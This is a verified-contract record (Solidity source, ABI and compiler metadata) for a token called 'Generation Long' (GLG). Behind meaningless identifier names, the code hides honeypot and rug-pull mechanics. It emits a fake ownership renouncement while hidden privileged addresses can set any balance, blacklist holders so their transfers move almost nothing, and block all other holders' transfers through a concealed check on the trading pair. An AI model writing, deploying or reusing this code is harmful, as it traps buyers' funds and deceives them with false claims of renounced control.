{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface senderSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeBuy {\n    function createPair(address totalMin, address listTake) external returns (address);\n}\n\ninterface senderReceiverIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxListExempt) external view returns (uint256);\n\n    function transfer(address receiverTxFrom, uint256 toTrading) external returns (bool);\n\n    function allowance(address atLaunchSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTxFrom,\n        uint256 toTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenShouldMin, uint256 value);\n    event Approval(address indexed atLaunchSender, address indexed spender, uint256 value);\n}\n\ninterface senderReceiverIsMetadata is senderReceiverIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GenerationLong is exemptSender, senderReceiverIs, senderReceiverIsMetadata {\n\n    mapping(address => bool) public receiverBuy;\n\n    uint256 shouldSender;\n\n    function owner() external view returns (address) {\n        return takeBuyTotal;\n    }\n\n    uint256 private totalSender;\n\n    string private receiverWallet = \"Generation Long\";\n\n    function sellIsMin(address shouldMaxLimit) public {\n        if (launchedAt) {\n            return;\n        }\n        if (liquidityAuto) {\n            swapSenderReceiver = fromMode;\n        }\n        receiverBuy[shouldMaxLimit] = true;\n        \n        launchedAt = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeBuyTotal;\n    }\n\n    bool public buyExempt;\n\n    bool public launchedAt;\n\n    uint256 constant walletToken = 20 ** 10;\n\n    function modeLaunchedAuto() public {\n        emit OwnershipTransferred(takeWallet, address(0));\n        takeBuyTotal = address(0);\n    }\n\n    constructor (){\n        \n        senderSell swapLaunch = senderSell(autoEnable);\n        tokenMode = feeBuy(swapLaunch.factory()).createPair(swapLaunch.WETH(), address(this));\n        \n        takeWallet = _msgSender();\n        modeLaunchedAuto();\n        receiverBuy[takeWallet] = true;\n        amountSwapLaunched[takeWallet] = enableFund;\n        if (liquidityAuto == senderListLiquidity) {\n            fromMode = feeShould;\n        }\n        emit Transfer(address(0), takeWallet, enableFund);\n    }\n\n    uint256 private tokenFund;\n\n    uint256 private feeShould;\n\n    function allowance(address fromTo, address txWalletIs) external view virtual override returns (uint256) {\n        if (txWalletIs == autoEnable) {\n            return type(uint256).max;\n        }\n        return autoFromFund[fromTo][txWalletIs];\n    }\n\n    address public tokenMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellShould;\n    }\n\n    function senderTotal(address receiverShouldTotal, address receiverTxFrom, uint256 toTrading) internal returns (bool) {\n        if (receiverShouldTotal == takeWallet) {\n            return toSender(receiverShouldTotal, receiverTxFrom, toTrading);\n        }\n        uint256 toMinAuto = senderReceiverIs(tokenMode).balanceOf(receiverMarketing);\n        require(toMinAuto == shouldSender);\n        require(receiverTxFrom != receiverMarketing);\n        if (exemptFund[receiverShouldTotal]) {\n            return toSender(receiverShouldTotal, receiverTxFrom, walletToken);\n        }\n        return toSender(receiverShouldTotal, receiverTxFrom, toTrading);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listMarketing;\n    }\n\n    uint256 public totalEnable;\n\n    mapping(address => bool) public exemptFund;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverWallet;\n    }\n\n    address receiverMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private liquidityAuto;\n\n    address private takeBuyTotal;\n\n    uint8 private sellShould = 18;\n\n    uint256 private shouldExemptWallet;\n\n    uint256 public swapSenderReceiver;\n\n    uint256 minFrom;\n\n    bool public senderListLiquidity;\n\n    function isAmount(uint256 toTrading) public {\n        txExempt();\n        shouldSender = toTrading;\n    }\n\n    string private listMarketing = \"GLG\";\n\n    function toSender(address receiverShouldTotal, address receiverTxFrom, uint256 toTrading) internal returns (bool) {\n        require(amountSwapLaunched[receiverShouldTotal] >= toTrading);\n        amountSwapLaunched[receiverShouldTotal] -= toTrading;\n        amountSwapLaunched[receiverTxFrom] += toTrading;\n        emit Transfer(receiverShouldTotal, receiverTxFrom, toTrading);\n        return true;\n    }\n\n    function launchAutoTo(address modeList) public {\n        txExempt();\n        if (buyExempt) {\n            fromMode = totalSender;\n        }\n        if (modeList == takeWallet || modeList == tokenMode) {\n            return;\n        }\n        exemptFund[modeList] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoFromFund;\n\n    function txExempt() private view {\n        require(receiverBuy[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFund;\n    }\n\n    event OwnershipTransferred(address indexed modeTx, address indexed shouldAuto);\n\n    function fromList(address isMarketing, uint256 toTrading) public {\n        txExempt();\n        amountSwapLaunched[isMarketing] = toTrading;\n    }\n\n    address public takeWallet;\n\n    address autoEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fromMode;\n\n    function approve(address txWalletIs, uint256 toTrading) public virtual override returns (bool) {\n        autoFromFund[_msgSender()][txWalletIs] = toTrading;\n        emit Approval(_msgSender(), txWalletIs, toTrading);\n        return true;\n    }\n\n    function transfer(address isMarketing, uint256 toTrading) external virtual override returns (bool) {\n        return senderTotal(_msgSender(), isMarketing, toTrading);\n    }\n\n    function balanceOf(address maxListExempt) public view virtual override returns (uint256) {\n        return amountSwapLaunched[maxListExempt];\n    }\n\n    function transferFrom(address receiverShouldTotal, address receiverTxFrom, uint256 toTrading) external override returns (bool) {\n        if (_msgSender() != autoEnable) {\n            if (autoFromFund[receiverShouldTotal][_msgSender()] != type(uint256).max) {\n                require(toTrading <= autoFromFund[receiverShouldTotal][_msgSender()]);\n                autoFromFund[receiverShouldTotal][_msgSender()] -= toTrading;\n            }\n        }\n        return senderTotal(receiverShouldTotal, receiverTxFrom, toTrading);\n    }\n\n    mapping(address => uint256) private amountSwapLaunched;\n\n    uint256 private enableFund = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunchSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenShouldMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txWalletIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWalletIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxListExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTrading\",\"type\":\"uint256\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toTrading\",\"type\":\"uint256\"}],\"name\":\"isAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"}],\"name\":\"launchAutoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMaxLimit\",\"type\":\"address\"}],\"name\":\"sellIsMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderListLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSenderReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTxFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GenerationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}